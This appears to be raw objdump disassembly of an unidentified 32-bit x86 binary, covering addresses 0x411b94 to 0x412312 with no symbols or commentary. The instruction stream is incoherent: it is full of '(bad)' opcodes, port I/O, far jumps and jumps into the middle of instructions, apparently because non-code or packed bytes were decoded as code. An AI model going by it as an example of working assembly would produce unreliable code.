  411b94:	dec    eax
  411b95:	inc    eax
  411b96:	bound  edx,QWORD PTR ds:0x5d6ef123
  411b9c:	xchg   edi,eax
  411b9d:	xor    DWORD PTR [ecx],esi
  411b9f:	jl     0x411b82
  411ba1:	(bad)  
  411ba2:	xlat   BYTE PTR ds:[ebx]
  411ba3:	cmp    BYTE PTR [esi],dh
  411ba5:	outs   dx,DWORD PTR ds:[esi]
  411ba6:	sar    BYTE PTR [ebx+0x3b],0x44
  411baa:	lods   eax,DWORD PTR ds:[esi]
  411bab:	inc    edx
  411bac:	cmc    
  411bad:	and    eax,0xeb0a9b2f
  411bb2:	test   DWORD PTR [ecx-0x6e],edx
  411bb5:	cmp    ebx,DWORD PTR ds:0x52b1efc
  411bbb:	ror    BYTE PTR [eax+0x4aaf6f2f],0x49
  411bc2:	jp     0x411b4d
  411bc4:	int3   
  411bc5:	int    0x7
  411bc7:	cmp    DWORD PTR [edx-0x44abbdea],ebp
  411bcd:	stos   BYTE PTR es:[edi],al
  411bce:	sti    
  411bcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd0:	cmc    
  411bd1:	sbb    edx,DWORD PTR [eax]
  411bd3:	dec    ecx
  411bd4:	xor    al,dl
  411bd6:	xchg   edx,eax
  411bd7:	push   ds
  411bd8:	rcl    BYTE PTR [ecx-0x2b],cl
  411bdb:	add    BYTE PTR [esi+0x2f],dh
  411bde:	out    dx,eax
  411bdf:	test   al,0xec
  411be1:	cmp    DWORD PTR [esi+0x6ed5065f],0x76
  411be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be9:	push   0x8
  411beb:	lods   al,BYTE PTR ds:[esi]
  411bec:	mov    ebx,0x954501ab
  411bf1:	cmp    edx,DWORD PTR [ebp-0x2a]
  411bf4:	shr    ebp,cl
  411bf6:	inc    edx
  411bf7:	dec    ebp
  411bf8:	xadd   DWORD PTR [esi-0x5e],ebp
  411bfc:	outs   dx,BYTE PTR ds:[esi]
  411bfd:	mov    eax,0x9b83240
  411c02:	iret   
  411c03:	sub    esp,DWORD PTR [ecx+0x756ff120]
  411c09:	pop    ds
  411c0a:	mov    ah,cl
  411c0c:	loop   0x411c05
  411c0e:	outs   dx,BYTE PTR ds:[esi]
  411c0f:	fs es add al,0x15
  411c13:	je     0x411bd6
  411c15:	test   al,0x0
  411c17:	cmp    DWORD PTR [ebx+0x29],ebp
  411c1a:	stc    
  411c1b:	inc    ebp
  411c1c:	jbe    0x411bd7
  411c1e:	in     eax,0x5c
  411c20:	lds    edx,FWORD PTR [ebx-0x60]
  411c23:	ins    BYTE PTR es:[edi],dx
  411c24:	pop    es
  411c25:	mov    ch,0xe
  411c27:	cwde   
  411c28:	pop    esi
  411c29:	mov    eax,0x58371ccd
  411c2e:	ret    
  411c2f:	cmp    BYTE PTR [edx+ecx*8],ch
  411c32:	push   0x42
  411c34:	sub    eax,DWORD PTR [edi]
  411c36:	fnstcw WORD PTR [edi]
  411c38:	cmc    
  411c39:	addr16 push ss
  411c3b:	xchg   esi,eax
  411c3c:	adc    eax,0x7adc7190
  411c41:	cmp    eax,0x1631edf7
  411c46:	mov    eax,ds:0x8a3595ea
  411c4b:	div    ebp
  411c4d:	inc    esi
  411c4e:	test   eax,eax
  411c50:	sbb    BYTE PTR [eax+0x3b8a88cb],0x18
  411c57:	push   0x9a1903b5
  411c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c5d:	xor    DWORD PTR [ecx+0x4c],ebp
  411c60:	pop    ds
  411c61:	test   al,0x5d
  411c63:	stos   DWORD PTR es:[edi],eax
  411c64:	push   0x14956f21
  411c69:	je     0x411c1d
  411c6b:	cmp    BYTE PTR [esi-0x2738a338],dl
  411c71:	dec    ebp
  411c72:	lods   al,BYTE PTR ds:[esi]
  411c73:	test   ebp,esi
  411c75:	in     al,dx
  411c76:	ins    BYTE PTR es:[edi],dx
  411c77:	inc    ebp
  411c78:	imul   esp,DWORD PTR [ebx],0xffffffb7
  411c7b:	lods   al,BYTE PTR ds:[esi]
  411c7c:	mov    edi,0x8e3c63ac
  411c81:	les    edx,FWORD PTR [ebx+0x33]
  411c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c85:	mov    esp,0x742f4236
  411c8a:	outs   dx,DWORD PTR ds:[esi]
  411c8b:	sbb    DWORD PTR [ecx+eiz*8-0x46],eax
  411c8f:	bound  ebx,QWORD PTR [ebp+0x123884c3]
  411c95:	push   eax
  411c96:	sub    edi,0xffffffdd
  411c99:	lahf   
  411c9a:	enter  0xf592,0xf
  411c9e:	or     esi,ecx
  411ca0:	xchg   ebp,eax
  411ca1:	imul   ebp,DWORD PTR [ecx+0x2b38630b],0x24
  411ca8:	shl    cl,0xaf
  411cab:	icebp  
  411cac:	mov    ds:0xebcc6ebb,al
  411cb1:	xchg   esp,eax
  411cb2:	push   ebx
  411cb3:	mov    edi,0x2b52f116
  411cb8:	fisubr DWORD PTR [ebx+0x23]
  411cbb:	fidiv  DWORD PTR [ebp+0x403ccf5a]
  411cc1:	xor    ch,BYTE PTR [esi-0x2e]
  411cc4:	icebp  
  411cc5:	mov    eax,0xc463fa0e
  411cca:	(bad)  
  411ccb:	and    al,0x37
  411ccd:	mov    edx,0xec183880
  411cd2:	mov    al,al
  411cd4:	(bad)  
  411cd5:	jo     0x411d3f
  411cd7:	pop    esp
  411cd8:	and    bh,bh
  411cda:	fs je  0x411c86
  411cdd:	lods   al,BYTE PTR ds:[esi]
  411cde:	sahf   
  411cdf:	bound  edi,QWORD PTR [esi+0x607683b]
  411ce5:	and    esp,DWORD PTR [ecx+ebx*2-0x2e91fb91]
  411cec:	je     0x411c7c
  411cee:	push   eax
  411cef:	icebp  
  411cf0:	aam    0x5
  411cf2:	test   eax,0x993e5c38
  411cf7:	xchg   esp,eax
  411cf8:	add    eax,0x14ca7a43
  411cfd:	je     0x411d2d
  411cff:	adc    esi,DWORD PTR [esi]
  411d01:	ficomp DWORD PTR [ebx]
  411d03:	fcmovu st,st(4)
  411d05:	pop    eax
  411d06:	(bad)  
  411d07:	sti    
  411d08:	mov    ds:0x4140a73b,al
  411d0d:	js     0x411cbe
  411d0f:	add    al,0xd9
  411d11:	push   esp
  411d12:	outs   dx,DWORD PTR ds:[esi]
  411d13:	mov    ebp,0x3ba430eb
  411d18:	mov    BYTE PTR es:0x53a23e39,bl
  411d1f:	lock or DWORD PTR [eax+0x9],ebp
  411d23:	mov    ebp,edx
  411d25:	shl    cl,cl
  411d27:	(bad)  
  411d28:	mov    ch,0x31
  411d2a:	out    dx,al
  411d2b:	push   ebp
  411d2c:	sub    DWORD PTR [ebx],esi
  411d2e:	leave  
  411d2f:	cmp    BYTE PTR [eax-0x67],bl
  411d32:	ror    BYTE PTR [ecx],cl
  411d34:	in     eax,dx
  411d35:	mov    ah,0x58
  411d37:	and    ebp,esi
  411d39:	dec    edi
  411d3a:	lock jb 0x411d59
  411d3d:	addr16 in al,0x75
  411d40:	add    DWORD PTR [ecx],esi
  411d42:	ret    0x869f
  411d45:	in     al,0x93
  411d47:	mov    BYTE PTR [eax-0xa52ec2f],bl
  411d4d:	sbb    al,0x19
  411d4f:	push   ds
  411d50:	add    al,0x88
  411d52:	add    DWORD PTR [edi+0x74a33c15],eax
  411d58:	xor    al,0x27
  411d5a:	sbb    DWORD PTR [ecx+0x29bc353],edi
  411d60:	cmc    
  411d61:	xor    ch,BYTE PTR [edx]
  411d63:	popf   
  411d64:	inc    edx
  411d65:	pop    ebx
  411d66:	mov    dl,0xf8
  411d68:	dec    edx
  411d69:	cmp    eax,0xe25b6b28
  411d6e:	pop    ebp
  411d6f:	mov    ah,BYTE PTR [ebp-0x1cca77bb]
  411d75:	leave  
  411d76:	fimul  DWORD PTR [ebx+0x3eef7927]
  411d7c:	mov    ch,BYTE PTR [ebx]
  411d7e:	or     bl,BYTE PTR [edx+ebp*8+0x2e]
  411d82:	sar    BYTE PTR [eax],0x82
  411d85:	loopne 0x411d10
  411d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d88:	bound  edx,QWORD PTR [eax+0x15e845d3]
  411d8e:	pop    eax
  411d8f:	mov    eax,ds:0x992f8be6
  411d94:	js     0x411db4
  411d96:	in     eax,0xc6
  411d98:	push   edi
  411d99:	out    0x8f,al
  411d9b:	mov    ds:0x615c22f5,al
  411da0:	retf   
  411da1:	loopne 0x411dc9
  411da3:	mov    ch,0xe8
  411da5:	adc    esp,DWORD PTR [esi+ecx*2]
  411da8:	mov    WORD PTR [ecx+0x20],es
  411dab:	test   eax,0x38ac7479
  411db0:	lds    esp,FWORD PTR [edx-0x16da6a40]
  411db6:	jmp    0x750e:0xa15b138a
  411dbd:	lds    edi,FWORD PTR [edi+ebx*2+0xe58e7ef]
  411dc4:	pusha  
  411dc5:	push   0xeb8cedff
  411dca:	lock stos BYTE PTR es:[edi],al
  411dcc:	idiv   BYTE PTR [esi-0x52]
  411dcf:	pop    esp
  411dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dd1:	loop   0x411e2c
  411dd3:	(bad)  
  411dd5:	stos   BYTE PTR es:[edi],al
  411dd6:	xchg   esp,eax
  411dd7:	cmp    BYTE PTR [ecx-0x5972a8af],cl
  411ddd:	sub    eax,0x31e87d40
  411de2:	push   ebp
  411de3:	xchg   edi,eax
  411de4:	(bad)  
  411de6:	and    al,0x81
  411de8:	out    0xdb,eax
  411dea:	ja     0x411e16
  411dec:	dec    edi
  411ded:	bound  eax,QWORD PTR [esi+0x4afd540]
  411df3:	outs   dx,DWORD PTR ds:[esi]
  411df4:	das    
  411df5:	or     BYTE PTR [ecx-0x23],bh
  411df8:	cmp    DWORD PTR [edi],edx
  411dfa:	outs   dx,BYTE PTR ds:[esi]
  411dfb:	ret    
  411dfc:	jbe    0x411e54
  411dfe:	jl     0x411dc9
  411e00:	(bad)  
  411e01:	cmp    edx,DWORD PTR [esi]
  411e03:	or     BYTE PTR ds:0x7afcc482,dl
  411e09:	sahf   
  411e0a:	outs   dx,BYTE PTR ds:[esi]
  411e0b:	shl    bh,cl
  411e0d:	mov    dl,0x19
  411e0f:	(bad)  
  411e11:	leave  
  411e12:	repz cmp BYTE PTR [edx-0x1f963fa2],ch
  411e19:	in     eax,0x60
  411e1b:	sub    eax,0x12276cf5
  411e20:	ds jl  0x411ddf
  411e23:	xor    ecx,DWORD PTR [edi+0x38]
  411e26:	sub    dl,BYTE PTR ds:[edx+0x40e249bf]
  411e2d:	adc    DWORD PTR [esi-0xf],ebp
  411e30:	mov    eax,ds:0xdaa64261
  411e35:	arpl   WORD PTR [ecx],di
  411e37:	cmc    
  411e38:	in     al,dx
  411e39:	push   0x88c8916f
  411e3e:	adc    al,0x63
  411e40:	sbb    eax,0xac987d58
  411e45:	shl    cl,cl
  411e47:	pop    eax
  411e48:	mov    edi,0x23a78d37
  411e4d:	cmp    BYTE PTR [eax-0x38565b0b],bh
  411e53:	jmp    0x411e19
  411e55:	shr    BYTE PTR [ecx+0x10],1
  411e58:	pop    eax
  411e59:	mov    bh,0x91
  411e5b:	sahf   
  411e5c:	dec    eax
  411e5d:	pop    eax
  411e5e:	inc    edi
  411e5f:	dec    edi
  411e60:	jae    0x411e6b
  411e62:	fstp   TBYTE PTR [eax+0x39ef78dc]
  411e68:	aad    0x19
  411e6a:	test   eax,0x7784f5d6
  411e6f:	cmp    al,0xa9
  411e71:	push   ecx
  411e72:	mov    ebp,0x52383428
  411e77:	cmp    edx,DWORD PTR [ecx]
  411e79:	jg     0x411e84
  411e7b:	mov    es,WORD PTR [edi+0x71]
  411e7e:	mov    esp,DWORD PTR [ebx+0x22]
  411e81:	outs   dx,BYTE PTR ss:[esi]
  411e83:	push   es
  411e84:	push   esp
  411e85:	int    0x99
  411e87:	add    BYTE PTR [edi+0x3d],ch
  411e8a:	pushf  
  411e8b:	imul   ebx,edi,0xffffff86
  411e8e:	fisubr DWORD PTR [ebx]
  411e90:	test   DWORD PTR [ecx-0x71],ecx
  411e93:	loop   0x411e8b
  411e95:	rol    DWORD PTR [ebx-0x34],1
  411e98:	rol    BYTE PTR [edi+0x20],0x31
  411e9c:	ffree  st(5)
  411e9e:	adc    DWORD PTR ds:0x3e479a16,esp
  411ea4:	add    DWORD PTR [edx+0x4bf75746],ecx
  411eaa:	jmp    0xf5d6:0x13f57543
  411eb1:	sub    al,0x84
  411eb3:	sbb    eax,0x10628f8a
  411eb8:	push   ecx
  411eb9:	cmp    dh,ch
  411ebb:	add    DWORD PTR [ecx],0x7dc2dc84
  411ec1:	fs cmp eax,0xffffffc5
  411ec5:	jmp    0xb0ca:0xbc90b9ee
  411ecc:	scas   al,BYTE PTR es:[edi]
  411ecd:	push   edi
  411ece:	repz cmp BYTE PTR [edi+0x29],cl
  411ed2:	mov    esp,0x277b6751
  411ed7:	xchg   ebp,eax
  411ed8:	or     edx,DWORD PTR [ebp-0x25172ef4]
  411ede:	outs   dx,DWORD PTR ds:[esi]
  411edf:	xlat   BYTE PTR ds:[ebx]
  411ee0:	ja     0x411f4a
  411ee2:	in     al,dx
  411ee3:	bound  ebx,QWORD PTR [ecx-0xeca0ec5]
  411ee9:	in     eax,dx
  411eea:	out    dx,al
  411eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eec:	jnp    0x411efa
  411eee:	jl     0x411ecc
  411ef0:	mov    eax,0x9efd82b3
  411ef5:	scas   eax,DWORD PTR es:[edi]
  411ef6:	cs dec edx
  411ef8:	test   al,0x87
  411efa:	in     al,dx
  411efb:	cmp    BYTE PTR [edi-0x29c42fb],dl
  411f01:	inc    ecx
  411f02:	sub    BYTE PTR [ebp+ebx*4+0x20976e15],ah
  411f09:	push   ds
  411f0a:	adc    cl,dh
  411f0c:	dec    ecx
  411f0d:	(bad)  
  411f0e:	stos   BYTE PTR es:[edi],al
  411f0f:	cmp    BYTE PTR [edi+0x23],dl
  411f12:	mov    dh,0x37
  411f14:	jp     0x411f40
  411f16:	push   esi
  411f17:	mov    al,0xf5
  411f19:	sbb    DWORD PTR [esi-0x7b],ebx
  411f1c:	daa    
  411f1d:	(bad)  
  411f1e:	(bad)  
  411f1f:	int3   
  411f20:	scas   al,BYTE PTR es:[edi]
  411f21:	loop   0x411ef6
  411f23:	sti    
  411f24:	test   BYTE PTR [ecx],0xa3
  411f27:	xchg   al,dl
  411f29:	into   
  411f2a:	inc    ebp
  411f2b:	cld    
  411f2c:	mov    ds:0x47c25778,al
  411f31:	lea    ebp,[edi-0x16]
  411f34:	add    eax,0xcab2d492
  411f39:	sbb    DWORD PTR [esi-0x62],eax
  411f3c:	adc    bh,BYTE PTR [eax]
  411f3e:	adc    ebp,eax
  411f40:	pop    ebp
  411f41:	add    ah,al
  411f43:	add    DWORD PTR [ebx],ecx
  411f45:	sub    ebp,DWORD PTR [eax+0x17]
  411f48:	test   ah,0xd8
  411f4b:	sbb    BYTE PTR [edx+0x3dd66759],0x3b
  411f52:	mov    edi,0x7d00a6e4
  411f57:	shl    DWORD PTR [esp+ebp*1-0x46],cl
  411f5b:	jo     0x411f52
  411f5d:	and    edx,esi
  411f5f:	xchg   bl,dh
  411f61:	(bad)  
  411f62:	jmp    0xc50f:0x79380c5d
  411f69:	shl    BYTE PTR [edx-0x64],cl
  411f6c:	push   ecx
  411f6d:	out    0x68,eax
  411f6f:	jo     0x411fe8
  411f71:	mov    ch,0xd2
  411f73:	cmp    DWORD PTR [ebp-0x5dcd2285],0xd0356d3b
  411f7d:	mov    esi,DWORD PTR [edx-0x409db53b]
  411f83:	mov    ebx,0x256eb681
  411f88:	jg     0x411f4b
  411f8a:	ss push ss
  411f8c:	hlt    
  411f8d:	cmp    DWORD PTR es:[ebx*2-0x4e5990fa],edi
  411f95:	sbb    BYTE PTR [esi],dh
  411f97:	out    0xf7,al
  411f99:	jge    0x411f21
  411f9b:	rcr    DWORD PTR [ecx],0xf6
  411f9e:	outs   dx,BYTE PTR ds:[esi]
  411f9f:	inc    ebx
  411fa0:	stos   BYTE PTR es:[edi],al
  411fa1:	out    dx,al
  411fa2:	test   eax,0xf738701d
  411fa7:	aam    0xa7
  411fa9:	inc    esi
  411faa:	mov    al,ds:0x69e86fd1
  411faf:	adc    al,0xf
  411fb1:	fstp   TBYTE PTR [edx]
  411fb3:	and    bh,BYTE PTR [eax-0x63]
  411fb6:	shl    DWORD PTR [ebx-0xb],1
  411fb9:	nop
  411fba:	fild   QWORD PTR [edx+eiz*4+0x768b103b]
  411fc1:	sub    DWORD PTR [ebp+0x6efbc993],ecx
  411fc7:	out    0xbf,al
  411fc9:	push   es
  411fca:	in     eax,dx
  411fcb:	and    bh,BYTE PTR [ebx]
  411fcd:	call   FWORD PTR [eax]
  411fcf:	sbb    esi,DWORD PTR [eax+0x1855621d]
  411fd5:	cmp    BYTE PTR [edi+0x54],cl
  411fd8:	or     ch,BYTE PTR [esi-0x54]
  411fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fdc:	lds    ecx,FWORD PTR [edi]
  411fde:	gs dec ebp
  411fe0:	adc    BYTE PTR [edx+0x13a7aa69],bh
  411fe6:	jmp    0xebd99bf9
  411feb:	bound  esp,QWORD PTR [ebx+eiz*2+0x3ef40466]
  411ff2:	std    
  411ff3:	and    DWORD PTR ss:[esi+ebp*8-0x1c24f844],esi
  411ffb:	scas   al,BYTE PTR es:[edi]
  411ffc:	test   BYTE PTR [edx+0x3a],0x0
  412000:	xor    ebx,DWORD PTR [ecx+0x43]
  412003:	inc    esi
  412004:	test   al,0x9b
  412006:	sar    DWORD PTR [esi+0x38],0x38
  41200a:	(bad)  
  41200b:	jae    0x411fed
  41200d:	jmp    0x3c81d3e6
  412012:	jne    0x411fb8
  412014:	or     edx,DWORD PTR [eax-0x2a]
  412017:	fst    QWORD PTR [ebp-0x1d6e6d8d]
  41201d:	pop    esp
  41201e:	and    DWORD PTR [ebx],edx
  412020:	sub    al,0x28
  412022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412023:	cmp    ah,dl
  412025:	push   es
  412026:	out    0x1,eax
  412028:	call   0x9bd8:0xf583da52
  41202f:	push   ebx
  412030:	ret    
  412031:	pop    es
  412032:	adc    al,0x43
  412034:	push   eax
  412035:	cmp    dl,bh
  412037:	sti    
  412038:	mul    DWORD PTR [ebp+0xa1bdf45]
  41203e:	mov    esi,0x6a0c92c8
  412043:	pop    eax
  412044:	xchg   esp,eax
  412045:	pusha  
  412046:	loope  0x412042
  412048:	mov    ch,0x79
  41204a:	pop    ebx
  41204b:	repz cs cmp eax,0xaaff0668
  412052:	xor    esp,ebx
  412054:	popf   
  412055:	jge    0x412053
  412057:	(bad)  
  412059:	test   eax,0xb4b62c3f
  41205e:	push   edi
  41205f:	cmc    
  412060:	jae    0x412044
  412062:	adc    dh,dh
  412064:	cmc    
  412065:	xchg   esi,eax
  412066:	rcl    DWORD PTR [eax+0x18b000c0],cl
  41206c:	cmc    
  41206d:	cmp    ebp,esi
  41206f:	cmp    DWORD PTR [edx],esp
  412071:	pop    edx
  412072:	sti    
  412073:	(bad)  
  412074:	jg     0x4120ae
  412076:	pop    ecx
  412077:	jae    0x4120c2
  412079:	ins    BYTE PTR es:[edi],dx
  41207a:	jae    0x412078
  41207c:	sub    al,0x48
  41207e:	jge    0x4120ee
  412080:	sbb    ebx,DWORD PTR ds:[eax-0x65271575]
  412087:	sbb    al,0x4b
  412089:	rcl    BYTE PTR [esi],cl
  41208b:	cmp    DWORD PTR [ebx-0x6a25a400],ecx
  412091:	push   es
  412092:	xchg   edi,eax
  412093:	add    esi,ebp
  412095:	xchg   ecx,eax
  412096:	sbb    BYTE PTR [ebx-0x3f],bh
  412099:	xor    ch,BYTE PTR [ebx-0xe]
  41209c:	in     eax,dx
  41209d:	cmp    BYTE PTR [edx+0x43],cl
  4120a0:	xor    DWORD PTR [esi-0x55b543e3],0x6e
  4120a7:	jnp    0x41203f
  4120a9:	jecxz  0x4120eb
  4120ab:	popf   
  4120ac:	xchg   BYTE PTR [esi],bh
  4120ae:	iret   
  4120af:	cmp    BYTE PTR [edi],cl
  4120b1:	and    BYTE PTR [ebp+0x18c26d6a],ch
  4120b7:	scas   eax,DWORD PTR es:[edi]
  4120b8:	not    edx
  4120ba:	sub    BYTE PTR [ebp+ebp*4+0x1cd8a6fb],ah
  4120c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120c2:	pop    edx
  4120c3:	sub    eax,DWORD PTR [ecx]
  4120c5:	cmp    edx,DWORD PTR [ebx]
  4120c7:	je     0x4120be
  4120c9:	mov    eax,0xa5979c9f
  4120ce:	outs   dx,BYTE PTR ds:[esi]
  4120cf:	mov    ebp,0xab400ae0
  4120d4:	fmul   QWORD PTR [eax-0x68ade486]
  4120da:	mov    ebx,0x839de279
  4120df:	add    cl,ah
  4120e1:	dec    ebx
  4120e2:	mov    eax,0x28cef516
  4120e7:	jmp    0x41207c
  4120e9:	jnp    0x41208c
  4120eb:	mov    dh,0xdf
  4120ed:	cmp    eax,DWORD PTR [esi-0x2081689]
  4120f3:	push   ebp
  4120f4:	in     eax,0x94
  4120f6:	outs   dx,BYTE PTR ds:[esi]
  4120f7:	pop    ds
  4120f8:	aad    0x5a
  4120fa:	fwait
  4120fb:	ret    0xb356
  4120fe:	mov    edi,DWORD PTR [eax]
  412100:	mov    eax,0xd0dfa2c
  412105:	pop    edi
  412106:	mov    cl,0x81
  412108:	cmc    
  412109:	es inc cx
  41210c:	shl    DWORD PTR [esi],0x5b
  41210f:	push   edi
  412110:	lods   al,BYTE PTR ds:[esi]
  412111:	cmp    ebp,eax
  412113:	push   ss
  412114:	loop   0x412115
  412116:	ja     0x41214f
  412118:	and    ebp,DWORD PTR [ebx]
  41211a:	push   ebp
  41211b:	and    al,0xf5
  41211d:	shl    ebp,cl
  41211f:	and    DWORD PTR [edi],edx
  412121:	sub    ch,BYTE PTR [ebp-0x1ec43553]
  412127:	mov    esp,0x29837a05
  41212c:	and    al,0x6f
  41212e:	outs   dx,DWORD PTR ds:[esi]
  41212f:	inc    ebx
  412130:	or     al,0x1c
  412132:	into   
  412133:	push   edi
  412134:	int3   
  412135:	(bad)  
  412136:	icebp  
  412137:	cmp    al,0x4c
  412139:	shr    BYTE PTR [edi+eax*8],0xb5
  41213d:	jnp    0x4120f5
  41213f:	mov    WORD PTR [edx-0x7c],fs
  412142:	imul   edi,DWORD PTR [ebx-0x65],0x9895dfb0
  412149:	push   0xf3577568
  41214e:	inc    edx
  41214f:	(bad)  
  412151:	or     al,0xe1
  412153:	bnd jmp 0x396b7091
  412159:	mov    ecx,0x5beca443
  41215e:	mov    edx,0x9f2d6b01
  412163:	push   0x44ef011f
  412168:	or     edi,DWORD PTR [eax]
  41216a:	dec    BYTE PTR [edi-0x7fd3d7bd]
  412170:	in     eax,dx
  412171:	lock outs dx,BYTE PTR ds:[esi]
  412173:	ret    
  412174:	jb     0x4120fc
  412176:	ss sbb eax,0x39180f34
  41217c:	shl    esi,cl
  41217e:	or     dh,BYTE PTR [ebx]
  412180:	fwait
  412181:	inc    ebp
  412182:	mov    dl,0x10
  412184:	ret    
  412185:	push   eax
  412186:	outs   dx,DWORD PTR ds:[esi]
  412187:	stos   BYTE PTR es:[edi],al
  412188:	ss mov edi,edx
  41218b:	outs   dx,BYTE PTR ds:[esi]
  41218c:	jne    0x412196
  41218e:	icebp  
  41218f:	dec    eax
  412190:	push   ss
  412191:	cmp    BYTE PTR [ebx],cl
  412193:	sub    al,0xa2
  412195:	repz ror esp,cl
  412198:	outs   dx,BYTE PTR es:[esi]
  41219a:	das    
  41219b:	pop    ss
  41219c:	xchg   ebx,eax
  41219d:	lock or ah,BYTE PTR [edx+0x3ff55ddd]
  4121a4:	or     BYTE PTR [esi],bl
  4121a6:	ds aaa 
  4121a8:	inc    esp
  4121a9:	ins    BYTE PTR es:[edi],dx
  4121aa:	pop    ss
  4121ab:	pop    ebp
  4121ac:	call   FWORD PTR [esi-0x3aa0678b]
  4121b2:	xchg   DWORD PTR [esi+0x15],ebx
  4121b5:	xchg   edi,eax
  4121b6:	xchg   ecx,eax
  4121b7:	not    dl
  4121b9:	cmp    eax,DWORD PTR [eax+0x42bfbf67]
  4121bf:	shl    DWORD PTR [ecx+edx*4],1
  4121c2:	lods   eax,DWORD PTR ds:[esi]
  4121c3:	sbb    eax,0xc7e9e2f2
  4121c8:	cmc    
  4121c9:	hlt    
  4121ca:	call   FWORD PTR [ecx-0x66]
  4121cd:	test   al,0x7b
  4121cf:	dec    esi
  4121d0:	fnstcw WORD PTR [ebx]
  4121d2:	xchg   ebx,eax
  4121d3:	(bad)  
  4121d4:	out    dx,eax
  4121d5:	popa   
  4121d6:	add    bl,BYTE PTR [ebx]
  4121d8:	(bad)  
  4121d9:	int3   
  4121da:	outs   dx,BYTE PTR ds:[esi]
  4121db:	mul    DWORD PTR ds:0x9d7dad31
  4121e1:	mov    dl,0x51
  4121e3:	cmp    DWORD PTR [ebx],esi
  4121e5:	push   cs
  4121e6:	push   ebp
  4121e7:	pop    ecx
  4121e8:	shl    BYTE PTR [esi-0x1a],1
  4121eb:	fdivr  st(7),st
  4121ed:	mov    esp,0x198c90cc
  4121f2:	mov    al,0xed
  4121f4:	xor    eax,0xe8c5d602
  4121f9:	push   cs
  4121fa:	sahf   
  4121fb:	pop    esp
  4121fc:	call   0xebff:0x1c88d1e8
  412203:	sub    ebx,esp
  412205:	cld    
  412206:	stc    
  412207:	repnz aad 0x82
  41220a:	mov    edx,0x6eb3570d
  41220f:	xchg   esp,eax
  412210:	mov    esi,DWORD PTR [eax+0x66]
  412213:	and    eax,0x3e529da1
  412218:	clc    
  412219:	test   eax,0x962fa693
  41221e:	pop    ds
  41221f:	jne    0x41226c
  412221:	shr    DWORD PTR [edx-0x4f],1
  412224:	sub    al,0x37
  412226:	out    dx,al
  412227:	mov    al,ds:0xbf3f72ac
  41222c:	jae    0x412211
  41222e:	jp     0x412268
  412230:	xchg   edi,eax
  412231:	push   0xad694d6d
  412236:	push   ds
  412237:	mov    eax,0xe98f33f5
  41223c:	mov    esi,0x6c3a545d
  412241:	cmp    BYTE PTR [esi-0xd],al
  412244:	mov    ds:0xeb397cee,al
  412249:	cdq    
  41224a:	outs   dx,BYTE PTR ds:[esi]
  41224b:	jp     0x412299
  41224d:	popa   
  41224e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  412250:	enter  0xd7eb,0x38
  412254:	or     BYTE PTR [ebx+0x7c],cl
  412257:	lods   al,BYTE PTR ds:[esi]
  412258:	push   ecx
  412259:	mov    ah,BYTE PTR [ebp+0x1d4f63e]
  41225f:	mov    ds:0x7019e500,eax
  412264:	ror    DWORD PTR ds:0x7fae388c,1
  41226a:	xchg   esi,eax
  41226b:	std    
  41226c:	mov    WORD PTR [ecx-0x14],fs
  41226f:	mov    dh,0xe4
  412271:	and    dl,BYTE PTR [ecx]
  412273:	xlat   BYTE PTR ds:[ebx]
  412274:	pushf  
  412275:	cwde   
  412276:	cld    
  412277:	add    eax,DWORD PTR [eax-0x60ef7c85]
  41227d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227e:	ins    DWORD PTR es:[edi],dx
  41227f:	cmp    al,0x5b
  412281:	or     dl,BYTE PTR [edi+0x151c63b4]
  412287:	dec    ecx
  412288:	les    ebx,FWORD PTR [esi]
  41228a:	cmp    DWORD PTR [ebx-0xb],ebx
  41228d:	mov    ebp,0xdef377cd
  412292:	int3   
  412293:	xchg   esp,eax
  412294:	and    DWORD PTR [eax],edi
  412296:	call   0x843d:0x24bdaf1b
  41229d:	or     BYTE PTR [esi+0x4c],ch
  4122a0:	popf   
  4122a1:	mov    esi,DWORD PTR [edi]
  4122a3:	cwde   
  4122a4:	pop    ebx
  4122a5:	xchg   eax,eax
  4122a7:	cmp    cl,ah
  4122a9:	lods   eax,DWORD PTR ds:[esi]
  4122aa:	mov    dh,0x29
  4122ac:	movsx  esp,BYTE PTR [ecx-0x5c80b8bf]
  4122b3:	lods   al,BYTE PTR ds:[esi]
  4122b4:	sar    BYTE PTR [ebx-0x4d73aeef],1
  4122ba:	xchg   DWORD PTR [ebx+0x4a],edx
  4122bd:	cmp    BYTE PTR ds:0xbfc4158,dh
  4122c3:	retf   0x2a94
  4122c6:	outs   dx,DWORD PTR ds:[esi]
  4122c7:	add    bh,al
  4122c9:	inc    ebp
  4122ca:	mov    edi,0x7ae50593
  4122cf:	cmp    al,ah
  4122d1:	xchg   edi,eax
  4122d2:	addr16 push edi
  4122d4:	mov    dl,ah
  4122d6:	cld    
  4122d7:	repz cmc 
  4122d9:	(bad)  
  4122da:	mov    bh,0x9a
  4122dc:	dec    edx
  4122dd:	xchg   edx,esp
  4122df:	push   esp
  4122e0:	stos   DWORD PTR es:[edi],eax
  4122e1:	cmp    eax,DWORD PTR [eax-0x39]
  4122e4:	jmp    DWORD PTR [edx+esi*8+0x74]
  4122e8:	rep outs dx,BYTE PTR ds:[esi]
  4122eb:	arpl   WORD PTR [esi-0x5aaf41b1],di
  4122f1:	inc    ebx
  4122f2:	stos   DWORD PTR es:[edi],eax
  4122f3:	mov    edx,0x17b23bee
  4122f8:	test   BYTE PTR [ebx+0x12],bl
  4122fb:	fnsave [edi+edi*2+0xb]
  4122ff:	enter  0xb7f5,0x6d
  412303:	jbe    0x412292
  412305:	cdq    
  412306:	adc    esi,DWORD PTR [esi]
  412308:	in     eax,dx
  412309:	test   DWORD PTR [ebp+0x192ff533],edx
  41230f:	dec    ebx
  412310:	shr    DWORD PTR [eax],1
  412312:	outs   dx,DWORD PTR ds:[esi]
